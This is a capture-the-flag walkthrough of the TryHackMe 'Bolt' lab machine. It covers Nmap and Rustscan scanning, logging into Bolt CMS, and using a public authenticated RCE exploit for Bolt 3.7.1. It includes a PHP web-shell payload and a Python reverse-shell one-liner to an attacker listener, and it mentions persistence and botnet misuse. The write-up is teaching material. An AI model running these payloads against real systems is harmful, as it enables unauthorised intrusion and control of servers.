+++
title = "THM - Bolt Walkthrough"
date = "2021-11-02T00:00:00+13:00"
draft = false
+++

# 
BlogAbout
---

---
The following is a walkthrough for a basic machine that aims to educate beginners on proper enumeration and usage
of a CVE to perform an authenticated Remote Code Execution (RCE) vulnerability to get a root shell on the
server. Once root is obtained on a box there are a number of post exploitation activities seldom explored passed
'popping the box', however this is best let for another post for another day.

##### Initial Gathering
We start with a quick connection onto the TryHackMe lab and spinning up of the machine. We start with an Nmap,
the format I like to go for box scans is to start with Rustscan and then flesh the scan out with a more defined
Nmap one to wittle downt what those ports are. The commands are:
```rustscan -a <IP_ADDRESS>```**Note, Rustscan may not be installed by default on your instance of Kali, and will require Golang (Go) to
run.*

![](/images/rustscan_bolt.png)

Now that we have a list of IP addresses, we can move onto a more robust Nmap with the following command:```nmap -sV -sC -A -p <PORTS_DISCOVERED_DURING_RUSTSCAN> <IP_ADDRESS> -T4 -oN
initial_nmap_bolt```

![](/images/nmap_bolt.png)

So in summary we have the following information to work off of:
- port TCP/22 showing that we have a remote management Secure Shell (SSH) port active;
- We have an Apache 2.4.29 page listed at on port TCP/80;
- We have a PHP based application running a Bolt CMS (This would be enumerated if you scrolled through the nmap)
running on port TCP/8000
- The operating machine appears to be an Ubuntu server running as a web application.

##### Going deeper
Let's explore port TCP/8000 and take a look through the page.

![](/images/cms_frontpage_bolt.png)

Well at this point we have two potential usernames, jake or admin (or potential could be a default bolt username)
and a password. To figure out where we could login to (most CMS frameworks have administrator portals) we could
either bruteforce it, or alternatively just look at the documentation. Fortunately,[https://docs.boltcms.io/4.0/manual/login](https://docs.boltcms.io/4.0/manual/login)has the answer
with*/bolt*being the login page. Let's try the login here.

![](/images/inside_bolt.png)
We got in with the password we found, and the username being bolt. After trying jake and admin (together as
shown on the post and capitalised at the front as well) I decided to attempt bolt as this would be a logical
guess, especially if he is sharing this account for the 'secret' Bolt CMS blog.

##### Looking for the exploit
After a while of looking at the bolt CMS, we discover through enumeration the footer is that we are running a
version of Bolt 3.7.1. Seeing that the box has been all about Bolt so far, let's search exploits available for
Bolt 3.7.1, and namely looking at high impact CVEs such as RCE, injection, privesc, etc.

![](/images/exploit_search_bolt.png)
After starting with a generic search, it is prudent to keep adjusting your search until you get the exploit you
want. Let's take a run of this in an attempt to break it.

##### Exploitation and Dissecting the CVE
The best way to view and test the exploit is to port it over and view with the*-m*flag as so:```searchsploit -m 48296```Now lets briefly look at the code before we blindly execute it:

![](/images/review_exploit_bolt.png)
Now this looks very confusing however at 74 lines of code (loc) without any minimisation, we can pretty
realistically look at this and ascertain what it is doing. What this code does is:
1. Start by creating a web request session;
2. Using the session, login to the user specified when running the exploit by making a GET request to
/bolt/login to return the authentication token;
3. Post a new user to /bolt/profile with the display name*<?php system($_GET['test']);?>*;
4. Perform a GET request to the /bolt/overview/showcases page and use BeautifulSoup to extract the CSRF token.
5. Perform a GET request and obtain the table in /async/browse/cache/.sessions?multiselect=true;
6. Iterate over the entries in the table until you get a session injection, and can post a*test1.php*file to /files. This file contains the session display name in step*.3*so will execute this code .
7. Send a GET request to*test1.php?test=*which contains that display name code.
8. At this point, we have a web shell.
If this all sounded confusing, that's because a web shell taking advantage of sessions and renaming files is. It
took me multiple attempts to understand the exploit however now that we have a good understanding we can now run
it (To save time. It is usually best to get a trivial understanding, run it, and then analyse it if it works to
learn. You can't perform exploit analysis on every CVE you throw at a box).
(A testament to this is that I changed the*token*variable to```token = soup.find(attrs={"id":
"user_login__token"}).get("value")```which I would have not been able to do if I just script kiddied
it)
Running the exploit we are presented with the below.

![](/images/shell_bolt.png)

Now that we have a shell running root, we should work on running a more stable shell than the current web shell
than what we currently have. The command for this is:```python3 -c 'import
os,pty,socket;s=socket.socket();s.connect(("<LOCAL_IP>",<LISTENING_PORT>));[os.dup2(s.fileno(),f)for
f in(0,1,2)];pty.spawn("sh")'```
Listening with the command*nc -lvnp 9091*, we get a returned root shell. Upgrading our shell to fully
interactive and creating SSH keys and new accounts for persistence, we now can perform actions such as adding
this machine to a botnet, installing spyware, ransoming the box, or outright just breaking the build.

![](/images/root_bolt.png)

##### Conclusion
In this article, we successfully took a machine and went from initial information gathering to full exploitation.
I hope that the article helped to ellucidate the risks to poor security practice, as well as the need to
understand the exploits you are running and ability to modify what you are running.